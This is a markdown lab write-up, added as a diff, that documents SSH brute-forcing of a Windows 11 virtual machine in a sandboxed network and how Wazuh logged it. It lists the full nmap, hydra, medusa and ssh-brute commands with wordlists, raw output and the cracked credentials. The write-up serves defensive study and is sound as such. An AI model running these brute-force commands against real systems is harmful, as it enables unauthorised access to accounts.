@@ -1,0 +1,162 @@
+### 1 — Recon and Brute-Force (Windows Firewall Enabled)
+In this step, I scanned the target while Windows firewall was turned on to see our baseline security posture.
+
+* **Commands Executed on Kali:**
+  ```bash
+  sudo nmap -sV -p- 192.168.56.20
+
+Command Breakdown:
+
+    -p- : Tells Nmap to scan all 65,535 possible TCP ports instead of just the top 1,000 common ones.
+
+    -sV : Enables service version detection, which tries to figure out exactly what software version is running on any open port it finds.
+
+Results:
+
+The Windows Firewall dropped the probes on almost every port, showing 65,533 ports as filtered (meaning they gave no response). However, because OpenSSH is running on the target, Port 22 was discovered wide open:
+
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH for Windows_9.5 (protocol 2.0)
+7680/tcp open  pando-pub?
+
+Hydra & Medusa Phase
+
+In this step, I tested automated brute-force tools against the SSH service on Port 22.
+
+    Raw Terminal Log — Dictionary Setup & Initial Attacks:
+
+Bash
+
+┌──(kali㉿kali)-[~]
+└─$ echo -e "administrator\nguest\ncan\nwin11\nuser" > users.txt
+echo -e "password123\n123456\nmarathon\nwin11\nqwerty987" > passwords.txt
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -L users.txt -P passwords.txt ssh://192.168.56.20 -V -t 1
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-19 14:10:04
+[DATA] max  task per 1 server, overall 1 task, 25 login tries (l:5/p:5), ~25 tries per task
+[DATA] attacking ssh://192.168.56.20:22/
+[ATTEMPT] target 192.168.56.20 - login "administrator" - pass "password123" - 1 of 25 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.20 - login "administrator" - pass "123456" - 2 of 26 [child 0] (0/1)
+[ATTEMPT] target 192.168.56.20 - login "administrator" - pass "marathon" - 3 of 27 [child 0] (0/2)
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-19 14:10:24
+
+Raw Terminal Log — Second Hydra Attempt & Medusa Test:
+
+Bash
+
+┌──(kali㉿kali)-[~]
+└─$ nano users.txt
+
+┌──(kali㉿kali)-[~]
+└─$ nano passwords.txt
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -L users.txt -P passwords.txt ssh://192.168.56.20 -V -t 1 -w 1
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[WARNING] the waittime you set is low, this can result in errornous results
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-19 14:13:04
+[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5/p:5), ~25 tries per task
+[DATA] attacking ssh://192.168.56.20:22/
+[ATTEMPT] target 192.168.56.20 - login "administrator" - pass "password123" - 1 of 25 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.20 - login "administrator" - pass "123456" - 2 of 26 [child 0] (0/1)
+[ATTEMPT] target 192.168.56.20 - login "administrator" - pass "marathon" - 3 of 27 [child 0] (0/2)
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-19 14:13:05
+
+┌──(kali㉿kali)-[~]
+└─$ medusa -U users.txt -P passwords.txt -h 192.168.56.20 -M ssh -t 1
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ERROR: Failed to retrieve supported authentication modes. Aborting...
+ERROR: No supported authentication methods located.
+2026-06-19 14:14:33 ACCOUNT CHECK: [ssh] Host: 192.168.56.20 (1 of 1, 0 complete) User: administrator (1 of 5, 0 complete) Password: password123 (1 of 5 complete)
+
+Results and Analysis:
+
+    Tool Behavior: Hydra stopped after 3 attempts with a connection error. Medusa failed immediately because it could not connect to the SSH service.
+
+    Windows Defense: The target Windows OS detected the fast attack. Instead of a firewall block, Windows dropped the connection pool for the attacker IP (192.168.56.30) to protect the system.
+
+    SIEM Check: In Wazuh, I found multiple Rule 60122 alerts (Windows Event ID 4625 - Invalid password). The SSH service did not crash, but it blocked the traffic.
+
+1.C — Service Reset & Operator Login
+
+To fix the connection block and test a normal login, I restarted the service.
+
+    Command on Windows Target (PowerShell):
+    PowerShell
+
+    Restart-Service sshd
+
+SIEM Logs:
+
+    Service Restart: The restart cleared the connection block. Wazuh triggered Rule 61104 (Service startup type/state changed) at 14:31:23.
+
+    Operator Connection: The admin connected from the host machine at 14:32:05. The system showed a "Potential Security Risk" warning because the service keys changed.
+
+    Legitimate Log: The admin accepted the warning, entered the password, and generated a Windows Logon Success (Rule 60106) log at 14:32:13.089.
+
+1.D — Successful Attack (Nmap ssh-brute)
+
+Since fast tools failed, I used a slower, script-based attack with Nmap.
+
+    Raw Terminal Log — Nmap Success:
+
+Bash
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.56.20
+[sudo] password for kali:
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-19 14:33 +0300
+NSE: [ssh-brute] Trying username/password pair: administrator:administrator
+NSE: [ssh-brute] Trying username/password pair: guest:guest
+NSE: [ssh-brute] Trying username/password pair: can:can
+NSE: [ssh-brute] Trying username/password pair: win11:win11
+NSE: [ssh-brute] Trying username/password pair: user:user
+NSE: [ssh-brute] Trying username/password pair: can:password123
+NSE: [ssh-brute] Trying username/password pair: user:password123
+NSE: [ssh-brute] Trying username/password pair: can:123456
+NSE: [ssh-brute] Trying username/password pair: user:123456
+NSE: [ssh-brute] Trying username/password pair: can:marathon
+NSE: [ssh-brute] Trying username/password pair: user:marathon
+NSE: [ssh-brute] Trying username/password pair: can:win11
+NSE: [ssh-brute] Trying username/password pair: user:win11
+NSE: [ssh-brute] Trying username/password pair: can:qwerty987
+NSE: [ssh-brute] Trying username/password pair: user:qwerty987
+Nmap scan report for 192.168.56.20
+Host is up (0.00076s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-brute:
+|   Accounts:
+|     win11:win11 - Valid credentials
+|_  Statistics: Performed 15 guesses in 12 seconds, average tps: 1.2
+MAC Address: ***************** (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
+
+Analysis:
+Nmap worked at a slower speed (1.2 attempts per second). It did not trigger the Windows block and successfully found the correct credentials: win11:win11.
+SIEM Log Timeline
+
+This timeline shows the millisecond-level logs in Wazuh during the Nmap attack at 14:33:19.
+Timestamp	Rule ID	Rule Description	Analysis / Meaning
+14:33:19.266	60122	Logon Failure	Nmap tries wrong user/password pairs.
+14:33:19.303	60106	Windows Logon Success	The Breach: Nmap enters win11:win11. Windows accepts the login.
+14:33:19.305	67028	Special privileges assigned	Windows gives user tokens to the new session.
+14:33:19.321	60137	Windows User Logoff	The Script Footprint: Just 18 milliseconds later, Nmap logs off. This fast logoff proves it is an automated script.
+
+Lab Network & Data Rules
+
+Network Structure: The lab uses a VirtualBox Host-Only and NAT network setup (192.168.56.0/24). Outside networks or public Wi-Fi cannot access this environment. It is fully sandboxed.
+
+Data Minimization: For privacy, raw CSV logs are not uploaded to GitHub. Instead, I use this Markdown summary and dashboard images to document my findings.
